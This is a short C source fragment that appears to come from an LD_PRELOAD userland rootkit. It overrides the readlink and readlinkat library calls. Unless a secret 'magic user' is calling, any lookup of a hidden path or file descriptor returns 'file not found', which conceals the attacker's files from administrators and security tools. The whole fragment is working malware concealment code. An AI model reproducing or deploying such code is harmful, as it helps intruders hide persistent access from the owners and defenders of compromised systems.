ssize_t readlink(const char *pathname, char *buf, size_t bufsiz){
    hook(CREADLINK);
    if(magicusr()) return (ssize_t)call(CREADLINK, pathname, buf, bufsiz);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CREADLINK, pathname, buf, bufsiz);
}

ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz){
    hook(CREADLINKAT);
    if(magicusr()) return (ssize_t)call(CREADLINKAT, dirfd, pathname, buf, bufsiz);
    if(hidden_path(pathname) || hidden_fd(dirfd)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CREADLINKAT, dirfd, pathname, buf, bufsiz);
}
